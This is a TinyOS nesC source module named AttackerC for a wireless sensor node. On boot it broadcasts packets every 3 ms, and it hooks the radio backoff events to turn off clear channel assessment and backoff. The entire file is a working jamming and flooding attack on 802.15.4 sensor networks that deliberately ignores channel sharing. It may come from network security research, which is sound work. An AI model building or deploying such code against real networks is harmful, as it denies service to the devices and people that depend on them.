#include "Attacker.h"
#include <Timer.h>
#include <message.h>

module AttackerC
{
	uses interface Boot;
	uses interface Timer<TMilli> as Timer0;
	uses interface RadioBackoff;
	uses interface Packet;
	uses interface AMPacket;
	uses interface AMSend;
	uses interface SplitControl as AMControl;
}

implementation
{
	bool busy = FALSE;
	message_t pkt;
	uint16_t counter = 0;
	AttackerMsg *btrpkt;
	
	event void Boot.booted()
	{	
		call AMControl.start();
	}

	event void AMControl.startDone(error_t err)
	{
		if(err == SUCCESS)
		{
			call Timer0.startPeriodic(3); 
		}
		else
		{
			call AMControl.start();
		}
	}
	
	event void Timer0.fired()
	{
		if(!busy) //If the radio is not sending another packet..
		{               
			 //we initialize the packet to send..
	                btrpkt = (AttackerMsg*)(call Packet.getPayload(&pkt, sizeof(AttackerMsg)));
        	        btrpkt->someStuff1 = 0;
                	btrpkt->someStuff1 = 0;
	
			if(call AMSend.send(AM_BROADCAST_ADDR, &pkt, sizeof(AttackerMsg)) == SUCCESS) //we send the packet in the air...
			{
				busy = TRUE;
			}
		}
	}

	event void AMControl.stopDone(error_t err){}

	event void AMSend.sendDone(message_t* msg, error_t error)
	{
   		if (&pkt == msg)
   		{
      			busy = FALSE;
    	}
  	}
	
	async event void RadioBackoff.requestCca(message_t * ONE msg) {call RadioBackoff.setCca(FALSE);} //We intercept the desired event to disable CCA
	async event void RadioBackoff.requestInitialBackoff(message_t * ONE msg) {}
	async event void RadioBackoff.requestCongestionBackoff(message_t * ONE msg) {}

}
